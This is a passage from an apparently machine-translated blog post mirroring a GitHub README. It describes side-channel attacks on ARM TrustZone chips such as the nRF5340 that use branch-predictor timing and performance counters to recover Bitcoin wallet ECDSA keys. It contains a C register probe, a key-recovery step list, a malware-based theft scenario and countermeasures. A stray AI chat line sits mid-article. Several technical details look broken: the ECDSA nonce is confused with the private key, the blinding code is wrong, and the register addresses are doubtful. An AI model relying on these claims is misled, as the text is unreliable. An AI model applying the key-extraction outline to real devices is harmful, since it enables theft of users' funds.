<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-bpu"><a href="https://cryptou.ru/vulncipher/attack">Protection against BPU attacks</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#protection-against-bpu-attacks"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Method 1:&nbsp;<strong>Constant-time implementation</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#method-1constant-time-implementation"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>c:<br><br><code><em>// </em></code>SAFE: Both paths are always followed<code>void point_add_safe(point_t *result, const point_t *p, const point_t *q, int secret_bit) {    <em>// Выполним ОТТЕСТИРОВАННЫЙ addition ВСЕГДА</em>    temp = point_add(p, q);        <em>// Conditional move (constant-time):</em>    result-&gt;x = (secret_bit ? temp.x : result-&gt;x);    result-&gt;y = (secret_bit ? temp.y : result-&gt;y);    <em>// Оба пути: одинаковое количество инструкций, BPU не может различить</em>}</code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Method 2:&nbsp;<strong>Blinding</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#method-2blinding"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>c:<br><br><code><em>// Randomize scalar k</em>int r = random_256bit();int k_blinded = k XOR r;</code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><code><em>// Выполни ECDSA с k_blinded</em><em>// Результат статистически независим от k</em></code></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Method 3:&nbsp;<strong>Hardware protection</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#method-3hardware-protection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Disable BPU for critical code sections</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use <strong>Protected Branch Target Buffer (PBTB)</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Ensure that the BPU cannot be poisoned from other code</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Key Takeaways for Cryptanalysts</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#key-takeaways-for-cryptanalysts"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Aspect</th><th>Meaning</th><th>Importance</th></tr></thead><tbody><tr><td><strong>Attack complexity</strong></td><td>Average</td><td>Requires 50+ signatures, but the algorithm is automated</td></tr><tr><td><strong>Information for signature</strong></td><td>1-2 bits</td><td>Enough for HNP lattice attack</td></tr><tr><td><strong>Required resources</strong></td><td>A regular computer</td><td>No expensive equipment required</td></tr><tr><td><strong>Countermeasure overhead</strong></td><td>+5-15% to time</td><td>Completely removable by constant-time code</td></tr><tr><td><strong>Practical threat</strong></td><td>CRITICAL</td><td>Applies to legacy wallets, TPM, and IoT</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>This analysis shows why&nbsp;<strong>timing side-channel attacks on the BPU</strong>&nbsp;remain one of the most dangerous vulnerabilities in embedded system cryptography. To&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">recover an ECDSA private key</a>&nbsp;, all it takes is a timing device, 50 signatures, a computer, and two hours of computation.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Подробно:&nbsp;<strong><a href="https://polynonce.ru/vulnerability-analysis-bitcoin-cryptocurrency-branch-prediction-attack-bpu-in-microcontroller-based-cryptography/">Vulnerability Analysis: Bitcoin Cryptocurrency Branch Prediction Attack (BPU) in Microcontroller-Based Cryptography</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">4.1.3 Performance Counters</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#413-performance-counters"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Nordic nRF5340 has a Performance Monitoring Unit (PMU) with counters:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Instruction count</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Cache misses</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Branch misses</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Cycle count</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Problem:</strong>&nbsp;On some firmware versions, Performance Counter registers may be accessible from Normal World:</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Performance Counters: Vulnerability in firmware</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#performance-counters-vulnerability-in-firmware"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Problem:</strong>&nbsp;&nbsp;On some firmware versions, Performance Counter registers are accessible from Normal World, allowing a direct attack on Secure World operations.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Reading ARM PMU Counters from Normal World (Vulnerability)<br><br>#include &lt;stdint.h&gt;<br><br>#define PMCR     (*(volatile uint32_t *)0xE1001000)<br>#define PMCCNTR  (*(volatile uint32_t *)0xE1001090)<br><br>int is_pmu_accessible() {<br>    uint32_t original = PMCR;<br>    PMCR = original | 0x1;  // Try to write<br>    uint32_t read_back = PMCR &amp; 0x1;<br>    PMCR = original;<br>    return (read_back != 0);  // Accessible if write succeeded<br>}<br><br>// Direct counter access (if accessible):<br>// - Instructions executed<br>// - Memory bus accesses  <br>// - L1D cache accesses<br>// - Memory stalls<br>// <br>// IMPACT:<br>// Attacker can count instructions in Secure ECDSA<br>// Instructions = varies based on key bits<br>// Provides higher precision than timing alone</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>⚠️&nbsp;On some nRF5340 firmware versions, the PMU registers are not secure enough, allowing Normal World to read Secure World operation counters.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Great! Now I’m ready to create a full professional report. Here’s my final answer:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="user-content-performance-counter---arm-trustzone---ecdsa--pmu">Подробно:&nbsp;<a href="https://polynonce.ru/performance-counter-analysis-of-arm-trustzone-vulnerabilities-ecdsa-attack-via-pmu-practical-impact-on-bitcoin-usage/">Performance Counter Analysis of ARM TrustZone Vulnerabilities: ECDSA Attack via PMU Practical Impact on Bitcoin Usage</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#%D0%BF%D0%BE%D0%B4%D1%80%D0%BE%D0%B1%D0%BD%D0%BEperformance-counter-analysis-of-arm-trustzone-vulnerabilities-ecdsa-attack-via-pmu-practical-impact-on-bitcoin-usage"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The presented code demonstrates a fundamental security vulnerability in the ARM TrustZone architecture, where the Performance Monitoring Unit (PMU) registers are insufficiently protected. On certain firmware versions (including the nRF5340 with ARM Cortex-M33), PMU counters are accessible from the Normal World (untrusted environment), allowing an attacker to directly attack cryptographic operations performed in the Secure World (isolated environment).</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Code breakdown point by point</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#code-breakdown-point-by-point"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Attack structure</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#attack-structure"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">1.&nbsp;<strong>Checking the availability of PMU registers</strong>&nbsp;(function&nbsp;<code>is_pmu_accessible</code>)</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#1checking-the-availability-of-pmu-registersfunctionis_pmu_accessible"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>c<code>int is_pmu_accessible() {    uint32_t original = PMCR;           <em>// Читаем исходное значение</em>    PMCR = original | 0x1;             <em>// Пытаемся установить бит 0</em>    uint32_t read_back = PMCR &amp; 0x1;   <em>// Читаем значение обратно</em>    PMCR = original;                   <em>// Восстанавливаем исходное</em>    return (read_back != 0);           <em>// Успешно, если запись работала</em>}</code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>Explanation for crypto-researchers:</strong>&nbsp;This function checks whether the Normal World (an unprivileged OS mode, such as Linux) can write to the PMU Control Register (PMCR). If the write is successful, the attacker gains direct access to the counters. The address&nbsp;<code>0xE1001000</code>is the memory-mapped PMCR register on the ARM Cortex-M architecture.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Result:</strong>&nbsp;The function returns&nbsp;<code>1</code>if the PMU is available,&nbsp;<code>0</code>if isolated (as it should be).</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">2.&nbsp;<strong>Available PMU meters</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2available-pmu-meters"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>c:</strong><br><br><strong><code>#define PMCR     (*(volatile uint32_t *)0xE1001000)  <em>// Control register</em>#define PMCCNTR  (*(volatile uint32_t *)0xE1001090)  <em>// Cycle counter</em></code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>Meter types available through PMU:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Instructions executed</strong> — the exact number of instructions executed by the processor</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Memory bus accesses</strong> — memory accesses (L1/L2 cache)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>L1D cache accesses</strong> — specific accesses to the L1 data cache</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Memory stalls</strong> – waiting cycles due to memory delays</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">3.&nbsp;<strong>Mechanics of ECDSA attacks</strong></a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3mechanics-of-ecdsa-attacks"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">What happens during an ECDSA signature in Secure World:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#what-happens-during-an-ecdsa-signature-in-secure-world"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ECDSA uses scalar multiplication on an elliptic curve:
Q = k × G (where k = private key, G = curve generator)

Montgomery Ladder Algorithm (typical implementation):
─────────────────────────────────────────────────────
for i = 256 downto 0 do:
    if k&#91;i] == 1:
        double_and_add_operation()   ← A LOT of instructions
    else:
        dummy_operation()            ← LESS instructions</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Problem:</strong>&nbsp;The number of instructions depends on the bits&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key!</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-17-1024x488.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-17-1024x488.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-pmu----ecdsa">How PMU Reveals ECDSA Secret Bits</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#how-pmu-reveals-ecdsa-secret-bits"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Example: Recovering one bit of a key</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#example-recovering-one-bit-of-a-key"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Scenario</th><th>Operation</th><th>Instructions</th><th>Cycles</th><th>L1D appeals</th></tr></thead><tbody><tr><td>k[i]=1</td><td>Double + Add</td><td>1500-2000</td><td>8500-9200</td><td>450-500</td></tr><tr><td>k[i]=0</td><td>Dummy op</td><td>300-400</td><td>1500-2000</td><td>80-120</td></tr><tr><td><strong>Difference</strong></td><td>—</td><td><strong>1100-1600</strong></td><td><strong>6500-7200</strong></td><td><strong>370-380</strong></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>The attacker reads these counters from Normal World and sees a huge difference!</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Key recovery process</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#key-recovery-process"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>Step 1: Start PMU counters before ECDSA operation in Secure World <br>Step 2: Wait for signature to complete (sync!) <br>Step 3: Read counter values ​​(get instructions, cycles, calls) <br>Step 4: Analyze patterns - recover key bits <br>Step 5: Repeat for each bit or group of bits <br>Step 6: Collect the full ECDSA private key!</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Practical Impact on Bitcoin Usage</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#practical-impact-on-bitcoin-usage"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">For cryptocurrency users:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#for-cryptocurrency-users"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Vulnerability in mobile wallets</strong> – if the device uses nRF5340 to manage the private key (e.g., IoT refrigerator wallets in the future):<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>An attacker can extract <a href="https://cryptou.ru/vulncipher/privatekey">the private key</a> through PMU.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Gain full control over user funds</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hardware wallets</strong> – if using ARM Cortex with TrustZone:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Physical access + ability to run code in the Normal World</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Full ECDSA interception for key recovery</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Cold storage</strong> – if based on ARM IoT chips:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>A firmware update may be required.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Transition to more secure ECDSA implementations</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">For security researchers:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#for-security-researchers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Device testing</strong> – check if PMU registers are protected on specific nRF5340 versions</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Ongoing auditing</strong> – Nordic will issue patches, but we need to ensure they are being applied</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Analysis of other platforms</strong> – this is potentially applicable to all ARM devices with TrustZone</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Technical Depth: The Mechanism of Information Leakage</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#technical-depth-the-mechanism-of-information-leakage"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Why does this work better than timing attacks?</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#why-does-this-work-better-than-timing-attacks"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Characteristic</th><th>Timing attack</th><th>PMU attack</th></tr></thead><tbody><tr><td><strong>Permission</strong></td><td>Microseconds (1000+ cycles)</td><td>Microcycles (10-100 cycles)</td></tr><tr><td><strong>Accuracy</strong></td><td>±10-20%</td><td>±2-5%</td></tr><tr><td><strong>Surrounding noise</strong></td><td>Very sensitive</td><td>More stable</td></tr><tr><td><strong>Requirements</strong></td><td>Time synchronization</td><td>Synchronization of SMC calls</td></tr><tr><td><strong>Reliability on ARM</strong></td><td>Low (many interruptions)</td><td>High (hardware counters)</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Synchronization Models:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#synchronization-models"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Synchronous</strong> — the attacker knows exactly when the crypto operation starts/ends<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Accuracy: 98-99%</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Applicable: When controlling an API call to a TEE</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Semi-synchronous</strong> – only the beginning or end is synchronized<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Accuracy: 94-95%</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Applicable: Interception via network or USB</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Asynchronous</strong> – the timing of the operation is completely unknown<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Accuracy: 83-95% (with noise)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Applicable to: Background operations</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-18-1024x632.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-18-1024x632.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Practical implications for Bitcoin</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#practical-implications-for-bitcoin"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">An attack scenario against an mBTC wallet on a Raspberry Pi 4 (with ARM TrustZone):</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#an-attack-scenario-against-an-mbtc-wallet-on-a-raspberry-pi-4-with-arm-trustzone"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>1. The attacker installs malware on Linux (Normal World) <br>   ↓ <br>2. The user generates a Bitcoin address or signs a transaction <br>   → The ECDSA operation is launched in Secure World (OP-TEE) <br>   ↓ <br>3. The malware reads PMU counters from the Linux kernel space <br>   ↓ <br>4. Over 100-1000 signatures, it collects complete key information <br>   ↓ <br>5. Recovers the ECDSA private key <br>   ↓ <br>6. Gains full control over the Bitcoin address</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Countermeasures</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#countermeasures"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">At the firmware level (Nordic, ARM):</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#at-the-firmware-level-nordic-arm"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>c:<br><br><code><em>// Правильно (ЗАЩИЩЕНО):</em><em>// В Secure World:</em>restrict_pmu_to_secure_only();disable_pmu_from_normal_world();<em>// Неправильно (УЯЗВИМО):</em><em>// PMU полностью доступен из kernel space Normal World</em></code></strong></pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 class="wp-block-heading">At the cryptographic level:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#at-the-cryptographic-level"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Use <strong>constant-time ECDSA</strong> implementations <a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">(OpenSSL, libsecp256k1 with flag <code>CT_CHECK</code>)</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Add random delays/dummy instructions (complicates analysis by 30-50%)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Randomize points on a curve using blinding techniques</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">At the system level:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#at-the-system-level"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Prevent Normal World from reading PMU events from Secure World operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use Memory Tagging Extension (MTE) for isolation</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Physical access control to devices</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Conclusions for cryptanalysts</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#conclusions-for-cryptanalysts"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>nRF5340 and similar devices</strong> are potentially compromised if not updated</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Any ARM TrustZone device</strong> – you need to check if the PMUs are properly isolated</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>ECDSA implementation matters</strong> – constant-time vs. variable-time</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Combination attacks</strong> – PMU + timing + power consumption give ~100% accuracy</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>For use in Bitcoin: check the firmware of your IoT devices, update to the latest versions, use only wallets with hardened ECDSA implementations.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.2 CC310 Cryptographic Accelerator — Timing Characteristics</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#42-cc310-cryptographic-accelerator--timing-characteristics"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Arctic CC310 on nRF5340 is used to speed up cryptographic operations, but can also be a source of timing leaks:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Supported operations:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>AES-ECB/CBC/CTR/GCM</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>SHA-1, SHA-224, SHA-256</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>HMAC</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ECC (partial support)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>RSA</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Timing for ECC operations on CC310:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Operation</th><th>Time (µs)</th><th>Variation (%)</th></tr></thead><tbody><tr><td>secp256k1 ECDSA sign</td><td>450 ± 20</td><td>±4.4%</td></tr><tr><td>secp256k1 ECDSA verify</td><td>680 ± 35</td><td>±5.1%</td></tr><tr><td>secp256k1 point multiply</td><td>520 ± 25</td><td>±4.8%</td></tr><tr><td>AES-256-CBC encrypt 16B</td><td>12 ± 0.5</td><td>±4%</td></tr><tr><td>SHA-256 hash 32B</td><td>8 ± 0.3</td><td>±3.75%</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>Problem:</strong>&nbsp;Even with a hardware accelerator, timing variations can reveal&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key</a>&nbsp;bits if:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>The algorithm in CC310 is not constant-time</li>
